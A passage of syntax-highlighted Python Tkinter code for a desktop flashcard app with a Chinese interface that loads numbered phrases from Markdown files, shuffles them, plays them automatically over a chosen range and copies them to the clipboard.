<br>                                              style=<span class="hljs-string">&quot;TButton&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.select_record_button.pack(side=<span class="hljs-string">&quot;left&quot;</span>, padx=<span class="hljs-number">5</span>)<br><br>        <span class="hljs-variable language_">self</span>.deduplicate_button = ttk.Button(file_frame, text=<span class="hljs-string">&quot;查重&quot;</span>, <br>                                            command=<span class="hljs-variable language_">self</span>.deduplicate_words, <br>                                            style=<span class="hljs-string">&quot;TButton&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.deduplicate_button.pack(side=<span class="hljs-string">&quot;left&quot;</span>, padx=<span class="hljs-number">5</span>)<br><br>        <span class="hljs-variable language_">self</span>.filter_button = ttk.Button(file_frame, text=<span class="hljs-string">&quot;过滤&quot;</span>, <br>                                        command=<span class="hljs-variable language_">self</span>.filter_words, <br>                                        style=<span class="hljs-string">&quot;TButton&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.filter_button.pack(side=<span class="hljs-string">&quot;left&quot;</span>, padx=<span class="hljs-number">5</span>)<br><br>        <span class="hljs-comment"># File path display labels</span><br>        <span class="hljs-variable language_">self</span>.current_file_label = tk.Label(main_frame, text=<span class="hljs-string">&quot;当前文件: 未加载文件&quot;</span>, <br>                                         font=(<span class="hljs-string">&quot;Helvetica&quot;</span>, <span class="hljs-number">10</span>), bg=<span class="hljs-string">&quot;#f0f2f5&quot;</span>, fg=<span class="hljs-string">&quot;#333333&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.current_file_label.pack(anchor=<span class="hljs-string">&quot;w&quot;</span>, pady=<span class="hljs-number">5</span>)<br><br>        <span class="hljs-variable language_">self</span>.record_file_label = tk.Label(main_frame, text=<span class="hljs-string">f&quot;记录文件: <span class="hljs-subst">&#123;self.record_file&#125;</span>&quot;</span>, <br>                                        font=(<span class="hljs-string">&quot;Helvetica&quot;</span>, <span class="hljs-number">10</span>), bg=<span class="hljs-string">&quot;#f0f2f5&quot;</span>, fg=<span class="hljs-string">&quot;#333333&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.record_file_label.pack(anchor=<span class="hljs-string">&quot;w&quot;</span>, pady=<span class="hljs-number">5</span>)<br><br>        range_frame = tk.Frame(main_frame, bg=<span class="hljs-string">&quot;#f0f2f5&quot;</span>)<br>        range_frame.pack(fill=<span class="hljs-string">&quot;x&quot;</span>, pady=<span class="hljs-number">10</span>)<br><br>        range_label = tk.Label(range_frame, text=<span class="hljs-string">&quot;输入单词范围 (A-B):&quot;</span>, font=(<span class="hljs-string">&quot;Helvetica&quot;</span>, <span class="hljs-number">12</span>), bg=<span class="hljs-string">&quot;#f0f2f5&quot;</span>)<br>        range_label.pack(side=<span class="hljs-string">&quot;left&quot;</span>, padx=<span class="hljs-number">5</span>)<br><br>        <span class="hljs-variable language_">self</span>.range_entry = tk.Entry(range_frame, font=(<span class="hljs-string">&quot;Helvetica&quot;</span>, <span class="hljs-number">12</span>))<br>        <span class="hljs-variable language_">self</span>.range_entry.pack(side=<span class="hljs-string">&quot;left&quot;</span>, padx=<span class="hljs-number">5</span>, fill=<span class="hljs-string">&quot;x&quot;</span>, expand=<span class="hljs-literal">True</span>)<br><br>        <span class="hljs-variable language_">self</span>.apply_range_button = ttk.Button(range_frame, text=<span class="hljs-string">&quot;应用范围&quot;</span>, command=<span class="hljs-variable language_">self</span>.apply_range, style=<span class="hljs-string">&quot;TButton&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.apply_range_button.pack(side=<span class="hljs-string">&quot;left&quot;</span>, padx=<span class="hljs-number">5</span>)<br><br>        word_frame = tk.Frame(main_frame, bg=<span class="hljs-string">&quot;white&quot;</span>, relief=<span class="hljs-string">&quot;raised&quot;</span>, bd=<span class="hljs-number">2</span>)<br>        word_frame.pack(fill=<span class="hljs-string">&quot;x&quot;</span>, pady=<span class="hljs-number">20</span>, padx=<span class="hljs-number">20</span>)<br>        <br>        <span class="hljs-variable language_">self</span>.word_text = tk.Text(word_frame, height=<span class="hljs-number">1</span>, wrap=<span class="hljs-string">&quot;none&quot;</span>, <br>                                font=(<span class="hljs-string">&quot;Helvetica&quot;</span>, <span class="hljs-number">36</span>, <span class="hljs-string">&quot;bold&quot;</span>), <br>                                bg=<span class="hljs-string">&quot;white&quot;</span>, fg=<span class="hljs-string">&quot;#333333&quot;</span>, <br>                                relief=<span class="hljs-string">&quot;flat&quot;</span>, state=<span class="hljs-string">&quot;disabled&quot;</span>, width=<span class="hljs-number">30</span>)<br>        <span class="hljs-variable language_">self</span>.word_text.pack(pady=<span class="hljs-number">30</span>)<br><br>        <span class="hljs-variable language_">self</span>.progress_label = tk.Label(main_frame, text=<span class="hljs-string">&quot;0/0&quot;</span>, <br>                                     font=(<span class="hljs-string">&quot;Helvetica&quot;</span>, <span class="hljs-number">14</span>), <br>                                     bg=<span class="hljs-string">&quot;#f0f2f5&quot;</span>, <br>                                     fg=<span class="hljs-string">&quot;#666666&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.progress_label.pack(pady=<span class="hljs-number">10</span>)<br><br>        input_frame = tk.Frame(main_frame, bg=<span class="hljs-string">&quot;#f0f2f5&quot;</span>)<br>        input_frame.pack(fill=<span class="hljs-string">&quot;x&quot;</span>, pady=<span class="hljs-number">10</span>)<br><br>        input_label = tk.Label(input_frame, text=<span class="hljs-string">&quot;输入新单词或短语:&quot;</span>, font=(<span class="hljs-string">&quot;Helvetica&quot;</span>, <span class="hljs-number">12</span>), bg=<span class="hljs-string">&quot;#f0f2f5&quot;</span>)<br>        input_label.pack(side=<span class="hljs-string">&quot;left&quot;</span>, padx=<span class="hljs-number">5</span>)<br><br>        <span class="hljs-variable language_">self</span>.word_entry = tk.Entry(input_frame, font=(<span class="hljs-string">&quot;Helvetica&quot;</span>, <span class="hljs-number">12</span>))<br>        <span class="hljs-variable language_">self</span>.word_entry.pack(side=<span class="hljs-string">&quot;left&quot;</span>, padx=<span class="hljs-number">5</span>, fill=<span class="hljs-string">&quot;x&quot;</span>, expand=<span class="hljs-literal">True</span>)<br><br>        button_frame = tk.Frame(main_frame, bg=<span class="hljs-string">&quot;#f0f2f5&quot;</span>)<br>        button_frame.pack(fill=<span class="hljs-string">&quot;x&quot;</span>, pady=<span class="hljs-number">20</span>)<br><br>        button_style = &#123;<span class="hljs-string">&quot;style&quot;</span>: <span class="hljs-string">&quot;TButton&quot;</span>, <span class="hljs-string">&quot;width&quot;</span>: <span class="hljs-number">12</span>&#125;<br>        <br>        <span class="hljs-variable language_">self</span>.prev_button = ttk.Button(button_frame, text=<span class="hljs-string">&quot;上一个&quot;</span>, <br>                                    command=<span class="hljs-variable language_">self</span>.show_previous_word, <br>                                    **button_style)<br>        <span class="hljs-variable language_">self</span>.prev_button.pack(side=<span class="hljs-string">&quot;left&quot;</span>, padx=<span class="hljs-number">5</span>)<br><br>        <span class="hljs-variable language_">self</span>.copy_button = ttk.Button(button_frame, text=<span class="hljs-string">&quot;复制&quot;</span>, <br>                                    command=<span class="hljs-variable language_">self</span>.copy_word, <br>                                    **button_style)<br>        <span class="hljs-variable language_">self</span>.copy_button.pack(side=<span class="hljs-string">&quot;left&quot;</span>, padx=<span class="hljs-number">5</span>)<br><br>        <span class="hljs-variable language_">self</span>.next_button = ttk.Button(button_frame, text=<span class="hljs-string">&quot;下一个&quot;</span>, <br>                                    command=<span class="hljs-variable language_">self</span>.show_next_word, <br>                                    **button_style)<br>        <span class="hljs-variable language_">self</span>.next_button.pack(side=<span class="hljs-string">&quot;left&quot;</span>, padx=<span class="hljs-number">5</span>)<br><br>        <span class="hljs-variable language_">self</span>.record_button = ttk.Button(button_frame, text=<span class="hljs-string">&quot;记录&quot;</span>, <br>                                      command=<span class="hljs-variable language_">self</span>.record_word, <br>                                      **button_style)<br>        <span class="hljs-variable language_">self</span>.record_button.pack(side=<span class="hljs-string">&quot;left&quot;</span>, padx=<span class="hljs-number">5</span>)<br><br>        <span class="hljs-variable language_">self</span>.delete_button = ttk.Button(button_frame, text=<span class="hljs-string">&quot;删除&quot;</span>, <br>                                      command=<span class="hljs-variable language_">self</span>.delete_word, <br>                                      **button_style)<br>        <span class="hljs-variable language_">self</span>.delete_button.pack(side=<span class="hljs-string">&quot;left&quot;</span>, padx=<span class="hljs-number">5</span>)<br><br>        <span class="hljs-comment"># Auto-play settings frame</span><br>        auto_play_frame = tk.Frame(main_frame, bg=<span class="hljs-string">&quot;#f0f2f5&quot;</span>)<br>        auto_play_frame.pack(fill=<span class="hljs-string">&quot;x&quot;</span>, pady=<span class="hljs-number">10</span>)<br><br>        interval_label = tk.Label(auto_play_frame, text=<span class="hljs-string">&quot;自动播放间隔（秒）:&quot;</span>, bg=<span class="hljs-string">&quot;#f0f2f5&quot;</span>)<br>        interval_label.pack(side=<span class="hljs-string">&quot;left&quot;</span>, padx=<span class="hljs-number">5</span>)<br><br>        <span class="hljs-variable language_">self</span>.interval_entry = tk.Entry(auto_play_frame, font=(<span class="hljs-string">&quot;Helvetica&quot;</span>, <span class="hljs-number">12</span>))<br>        <span class="hljs-variable language_">self</span>.interval_entry.pack(side=<span class="hljs-string">&quot;left&quot;</span>, padx=<span class="hljs-number">5</span>)<br>        <span class="hljs-variable language_">self</span>.interval_entry.insert(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;5&quot;</span>)  <span class="hljs-comment"># Default interval: 5 seconds</span><br><br>        direction_label = tk.Label(auto_play_frame, text=<span class="hljs-string">&quot;方向:&quot;</span>, bg=<span class="hljs-string">&quot;#f0f2f5&quot;</span>)<br>        direction_label.pack(side=<span class="hljs-string">&quot;left&quot;</span>, padx=<span class="hljs-number">10</span>)<br><br>        forward_radio = tk.Radiobutton(auto_play_frame, text=<span class="hljs-string">&quot;前进&quot;</span>, variable=<span class="hljs-variable language_">self</span>.direction_var, value=<span class="hljs-string">&quot;forward&quot;</span>, bg=<span class="hljs-string">&quot;#f0f2f5&quot;</span>)<br>        forward_radio.pack(side=<span class="hljs-string">&quot;left&quot;</span>)<br><br>        backward_radio = tk.Radiobutton(auto_play_frame, text=<span class="hljs-string">&quot;后退&quot;</span>, variable=<span class="hljs-variable language_">self</span>.direction_var, value=<span class="hljs-string">&quot;backward&quot;</span>, bg=<span class="hljs-string">&quot;#f0f2f5&quot;</span>)<br>        backward_radio.pack(side=<span class="hljs-string">&quot;left&quot;</span>)<br><br>        <span class="hljs-comment"># Auto-play status label</span><br>        <span class="hljs-variable language_">self</span>.auto_play_status = tk.Label(main_frame, text=<span class="hljs-string">&quot;自动播放: 关闭&quot;</span>, font=(<span class="hljs-string">&quot;Helvetica&quot;</span>, <span class="hljs-number">12</span>), bg=<span class="hljs-string">&quot;#f0f2f5&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.auto_play_status.pack(pady=<span class="hljs-number">10</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_interval</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;Get the interval from the entry widget, default to 5 if invalid.&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">try</span>:<br>            val = <span class="hljs-built_in">int</span>(<span class="hljs-variable language_">self</span>.interval_entry.get())<br>            <span class="hljs-keyword">return</span> val <span class="hljs-keyword">if</span> val &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-number">5</span><br>        <span class="hljs-keyword">except</span> ValueError:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">5</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">toggle_auto_play</span>(<span class="hljs-params">self, event=<span class="hljs-literal">None</span></span>):<br>        <span class="hljs-string">&quot;&quot;&quot;Toggle auto-play on/off when space is pressed.&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-variable language_">self</span>.displayed_words:<br>            messagebox.showinfo(<span class="hljs-string">&quot;提示&quot;</span>, <span class="hljs-string">&quot;没有可播放的单词或短语&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;break&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-variable language_">self</span>.auto_play_on:<br>            <span class="hljs-comment"># Start auto-play</span><br>            interval = <span class="hljs-variable language_">self</span>.get_interval()<br>            direction = <span class="hljs-variable language_">self</span>.direction_var.get()<br>            <span class="hljs-variable language_">self</span>.auto_play_on = <span class="hljs-literal">True</span><br>            <span class="hljs-variable language_">self</span>.auto_play_status.config(text=<span class="hljs-string">&quot;自动播放: 开启&quot;</span>)<br>            <span class="hljs-variable language_">self</span>.do_auto_play(interval, direction)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># Stop auto-play</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.auto_play_id <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                <span class="hljs-variable language_">self</span>.root.after_cancel(<span class="hljs-variable language_">self</span>.auto_play_id)<br>                <span class="hljs-variable language_">self</span>.auto_play_id = <span class="hljs-literal">None</span><br>            <span class="hljs-variable language_">self</span>.auto_play_on = <span class="hljs-literal">False</span><br>            <span class="hljs-variable language_">self</span>.auto_play_status.config(text=<span class="hljs-string">&quot;自动播放: 关闭&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;break&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">do_auto_play</span>(<span class="hljs-params">self, interval, direction</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;Handle automatic word switching based on interval and direction.&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">if</span> direction == <span class="hljs-string">&quot;forward&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-variable language_">self</span>.current_index &lt; <span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.displayed_words) - <span class="hljs-number">1</span>:<br>            <span class="hljs-variable language_">self</span>.current_index += <span class="hljs-number">1</span><br>            <span class="hljs-variable language_">self</span>.update_display()<br>            <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.auto_play_on:<br>                <span class="hljs-variable language_">self</span>.auto_play_id = <span class="hljs-variable language_">self</span>.root.after(interval * <span class="hljs-number">1000</span>, <span class="hljs-keyword">lambda</span>: <span class="hljs-variable language_">self</span>.do_auto_play(interval, direction))<br>        <span class="hljs-keyword">elif</span> direction == <span class="hljs-string">&quot;backward&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-variable language_">self</span>.current_index &gt; <span class="hljs-number">0</span>:<br>            <span class="hljs-variable language_">self</span>.current_index -= <span class="hljs-number">1</span><br>            <span class="hljs-variable language_">self</span>.update_display()<br>            <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.auto_play_on:<br>                <span class="hljs-variable language_">self</span>.auto_play_id = <span class="hljs-variable language_">self</span>.root.after(interval * <span class="hljs-number">1000</span>, <span class="hljs-keyword">lambda</span>: <span class="hljs-variable language_">self</span>.do_auto_play(interval, direction))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># Reached end or beginning, stop auto-play</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.auto_play_on:<br>                <span class="hljs-variable language_">self</span>.auto_play_on = <span class="hljs-literal">False</span><br>                <span class="hljs-variable language_">self</span>.auto_play_status.config(text=<span class="hljs-string">&quot;自动播放: 关闭&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">select_record_file</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;Select the file path for recording words.&quot;&quot;&quot;</span><br>        file_path = filedialog.askopenfilename(initialdir=<span class="hljs-variable language_">self</span>.default_path, <br>                                             title=<span class="hljs-string">&quot;选择记录文件&quot;</span>,<br>                                             filetypes=((<span class="hljs-string">&quot;Markdown files&quot;</span>, <span class="hljs-string">&quot;*.md&quot;</span>), <br>                                                       (<span class="hljs-string">&quot;Text files&quot;</span>, <span class="hljs-string">&quot;*.txt&quot;</span>), <br>                                                       (<span class="hljs-string">&quot;All files&quot;</span>, <span class="hljs-string">&quot;*.*&quot;</span>)))<br>        <span class="hljs-keyword">if</span> file_path:<br>            <span class="hljs-variable language_">self</span>.record_file = file_path<br>            <span class="hljs-variable language_">self</span>.record_file_label.config(text=<span class="hljs-string">f&quot;记录文件: <span class="hljs-subst">&#123;self.record_file&#125;</span>&quot;</span>)<br>            msg = tk.Label(<span class="hljs-variable language_">self</span>.root, text=<span class="hljs-string">f&quot;记录文件设定为: <span class="hljs-subst">&#123;file_path&#125;</span>&quot;</span>, <br>                         font=(<span class="hljs-string">&quot;Helvetica&quot;</span>, <span class="hljs-number">12</span>), fg=<span class="hljs-string">&quot;green&quot;</span>, <br>                         bg=<span class="hljs-string">&quot;#f0f2f5&quot;</span>)<br>            msg.pack(pady=<span class="hljs-number">5</span>)<br>            <span class="hljs-variable language_">self</span>.root.after(<span class="hljs-number">3000</span>, msg.destroy)<br>            <span class="hljs-variable language_">self</span>.log(<span class="hljs-string">f&quot;记录文件设定为: <span class="hljs-subst">&#123;file_path&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">load_default_file</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;Load the default Markdown file.&quot;&quot;&quot;</span><br>        <span class="hljs-variable language_">self</span>.load_markdown_file(<span class="hljs-variable language_">self</span>.default_file)<br>        <span class="hljs-variable language_">self</span>.current_file = <span class="hljs-variable language_">self</span>.default_file<br>        <span class="hljs-variable language_">self</span>.current_file_label.config(text=<span class="hljs-string">f&quot;当前文件: <span class="hljs-subst">&#123;self.current_file&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">load_file</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;Load a user-selected Markdown file.&quot;&quot;&quot;</span><br>        file_path = filedialog.askopenfilename(initialdir=<span class="hljs-variable language_">self</span>.default_path, <br>                                             title=<span class="hljs-string">&quot;选择Markdown文件&quot;</span>,<br>                                             filetypes=((<span class="hljs-string">&quot;Markdown files&quot;</span>, <span class="hljs-string">&quot;*.md&quot;</span>), <br>                                                       (<span class="hljs-string">&quot;all files&quot;</span>, <span class="hljs-string">&quot;*.*&quot;</span>)))<br>        <span class="hljs-keyword">if</span> file_path:<br>            <span class="hljs-variable language_">self</span>.load_markdown_file(file_path)<br>            <span class="hljs-variable language_">self</span>.current_file = file_path<br>            <span class="hljs-variable language_">self</span>.current_file_label.config(text=<span class="hljs-string">f&quot;当前文件: <span class="hljs-subst">&#123;self.current_file&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">load_markdown_file</span>(<span class="hljs-params">self, file_path</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;Load a Markdown file and extract phrases in the format &#x27;number. phrase&#x27;.&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>                content = file.read()<br>                lines = content.splitlines()<br>                matched_phrases = []<br>                unmatched_lines = []<br>                <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>                    <span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;^\s*\d+\.\s*(.*?)\s*$&#x27;</span>, line)<br>                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>                        matched_phrases.append(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>).strip())<br>                    <span class="hljs-keyword">elif</span> line.strip():<br>                        unmatched_lines.append(line)<br>                <br>                phrase_dict = &#123;phrase.lower(): phrase <span class="hljs-keyword">for</span> phrase <span class="hljs-keyword">in</span> matched_phrases&#125;<br>                <span class="hljs-variable language_">self</span>.words = <span class="hljs-built_in">list</span>(phrase_dict.values())<br>                <span class="hljs-variable language_">self</span>.log(<span class="hljs-string">f&quot;加载文件: <span class="hljs-subst">&#123;file_path&#125;</span>&quot;</span>)<br>                <span class="hljs-variable language_">self</span>.log(<span class="hljs-string">f&quot;总行数: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(lines)&#125;</span>, 匹配短语数: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(matched_phrases)&#125;</span>, 去重后: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(self.words)&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">if</span> unmatched_lines:<br>                    <span class="hljs-variable language_">self</span>.log(<span class="hljs-string">f&quot;未匹配的行 (<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(unmatched_lines)&#125;</span>):\n&quot;</span> + <span class="hljs-string">&quot;\n&quot;</span>.join(unmatched_lines))<br>                <br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-variable language_">self</span>.words:<br>                    messagebox.showinfo(<span class="hljs-string">&quot;提示&quot;</span>, <span class="hljs-string">&quot;未找到符合格式的单词或短语&quot;</span>)<br>                    <span class="hljs-keyword">return</span><br>                <br>                <span class="hljs-comment"># Set displayed_words to all words initially and shuffle</span><br>                <span class="hljs-variable language_">self</span>.displayed_words = <span class="hljs-variable language_">self</span>.words.copy()<br>                random.shuffle(<span class="hljs-variable language_">self</span>.displayed_words)<br>                <span class="hljs-variable language_">self</span>.current_index = <span class="hljs-number">0</span> <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.displayed_words <span class="hljs-keyword">else</span> -<span class="hljs-number">1</span><br>                <span class="hljs-variable language_">self</span>.start = <span class="hljs-literal">None</span><br>                <span class="hljs-variable language_">self</span>.end = <span class="hljs-literal">None</span><br>                <span class="hljs-variable language_">self</span>.range_applied = <span class="hljs-literal">False</span><br>                <span class="hljs-variable language_">self</span>.log(<span class="hljs-string">&quot;重置状态，准备展示新文件内容&quot;</span>)<br>                <span class="hljs-comment"># Stop auto-play when loading a new file</span><br>                <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.auto_play_on:<br>                    <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.auto_play_id <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                        <span class="hljs-variable language_">self</span>.root.after_cancel(<span class="hljs-variable language_">self</span>.auto_play_id)<br>                        <span class="hljs-variable language_">self</span>.auto_play_id = <span class="hljs-literal">None</span><br>                    <span class="hljs-variable language_">self</span>.auto_play_on = <span class="hljs-literal">False</span><br>                    <span class="hljs-variable language_">self</span>.auto_play_status.config(text=<span class="hljs-string">&quot;自动播放: 关闭&quot;</span>)<br>                <span class="hljs-variable language_">self</span>.update_display()<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-variable language_">self</span>.log(<span class="hljs-string">f&quot;加载文件失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>            messagebox.showerror(<span class="hljs-string">&quot;错误&quot;</span>, <span class="hljs-string">f&quot;加载文件失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">apply_range</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;Apply the user-specified range to filter displayed phrases and shuffle.&quot;&quot;&quot;</span><br>        range_text = <span class="hljs-variable language_">self</span>.range_entry.get().strip()<br>        <span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;^(\d+)-(\d+)$&#x27;</span>, range_text)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">match</span>:<br>            messagebox.showerror(<span class="hljs-string">&quot;错误&quot;</span>, <span class="hljs-string">&quot;无效的范围格式。请使用 &#x27;起始-结束&#x27; 格式，例如 &#x27;404-410&#x27;。&quot;</span>)<br>            <span class="hljs-keyword">return</span><br>        start, end = <span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, <span class="hljs-keyword">match</span>.groups())<br>        <span class="hljs-keyword">if</span> start &gt; end:<br>            messagebox.showerror(<span class="hljs-string">&quot;错误&quot;</span>, <span class="hljs-string">&quot;起始数字必须小于或等于结束数字。&quot;</span>)<br>            <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">if</span> start &lt; <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> end &gt; <span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.words):<br>            messagebox.showerror(<span class="hljs-string">&quot;错误&quot;</span>, <span class="hljs-string">f&quot;范围超出单词或短语数量。当前数量: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(self.words)&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span><br>        <span class="hljs-variable language_">self</span>.start = start<br>        <span class="hljs-variable language_">self</span>.end = end<br>        <span class="hljs-variable language_">self</span>.displayed_words = <span class="hljs-variable language_">self</span>.words[start-<span class="hljs-number">1</span>:end]<br>        random.shuffle(<span class="hljs-variable language_">self</span>.displayed_words)<br>        <span class="hljs-variable language_">self</span>.current_index = <span class="hljs-number">0</span> <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.displayed_words <span class="hljs-keyword">else</span> -<span class="hljs-number">1</span><br>        <span class="hljs-variable language_">self</span>.range_applied = <span class="hljs-literal">True</span><br>        <span class="hljs-variable language_">self</span>.log(<span class="hljs-string">f&quot;应用范围: <span class="hljs-subst">&#123;start&#125;</span>-<span class="hljs-subst">&#123;end&#125;</span>, 显示短语数: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(self.displayed_words)&#125;</span>&quot;</span>)<br>        <span class="hljs-comment"># Stop auto-play when applying a range</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.auto_play_on:<br>            <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.auto_play_id <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                <span class="hljs-variable language_">self</span>.root.after_cancel(<span class="hljs-variable language_">self</span>.auto_play_id)<br>                <span class="hljs-variable language_">self</span>.auto_play_id = <span class="hljs-literal">None</span><br>            <span class="hljs-variable language_">self</span>.auto_play_on = <span class="hljs-literal">False</span><br>            <span class="hljs-variable language_">self</span>.auto_play_status.config(text=<span class="hljs-string">&quot;自动播放: 关闭&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.update_display()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">show_next_word</span>(<span class="hljs-params">self, event=<span class="hljs-literal">None</span></span>):<br>        <span class="hljs-string">&quot;&quot;&quot;Show the next phrase in the displayed list.&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.displayed_words <span class="hljs-keyword">and</span> <span class="hljs-variable language_">self</span>.current_index &lt; <span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.displayed_words) - <span class="hljs-number">1</span>:<br>            <span class="hljs-variable language_">self</span>.current_index += <span class="hljs-number">1</span><br>            <span class="hljs-variable language_">self</span>.update_display()<br>        <span class="hljs-keyword">else</span>:<br>            messagebox.showinfo(<span class="hljs-string">&quot;提示&quot;</span>, <span class="hljs-string">&quot;已经是最后一个单词或短语&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;break&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">show_previous_word</span>(<span class="hljs-params">self, event=<span class="hljs-literal">None</span></span>):<br>        <span class="hljs-string">&quot;&quot;&quot;Show the previous phrase in the displayed list.&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.current_index &gt; <span class="hljs-number">0</span>:<br>            <span class="hljs-variable language_">self</span>.current_index -= <span class="hljs-number">1</span><br>            <span class="hljs-variable language_">self</span>.update_display()<br>        <span class="hljs-keyword">else</span>:<br>            messagebox.showinfo(<span class="hljs-string">&quot;提示&quot;</span>, <span class="hljs-string">&quot;已经是第一个单词或短语&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;break&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">on_mousewheel</span>(<span class="hljs-params">self, event</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;Handle mouse wheel events to navigate words.&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">if</span> event.delta &gt; <span class="hljs-number">0</span>:<br>            <span class="hljs-variable language_">self</span>.show_previous_word()<br>        <span class="hljs-keyword">elif</span> event.delta &lt; <span class="hljs-number">0</span>:<br>            <span class="hljs-variable language_">self</span>.show_next_word()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">copy_word</span>(<span class="hljs-params">self, event=<span class="hljs-literal">None</span></span>):<br>        <span class="hljs-string">&quot;&quot;&quot;Copy the selected text or the current phrase to clipboard.&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">try</span>:<br>            selected_text = <span class="hljs-variable language_">self</span>.word_text.get(<span class="hljs-string">&quot;sel.first&quot;</span>, <span class="hljs-string">&quot;sel.last&quot;</span>)<br>            <span class="hljs-variable language_">self</span>.root.clipboard_clear()<br>            <span class="hljs-variable language_">self</span>.root.clipboard_append(selected_text)<br>            <span class="hljs-variable language_">self</span>.log(<span class="hljs-string">f&quot;复制选中文本: <span class="hljs-subst">&#123;selected_text&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">except</span> 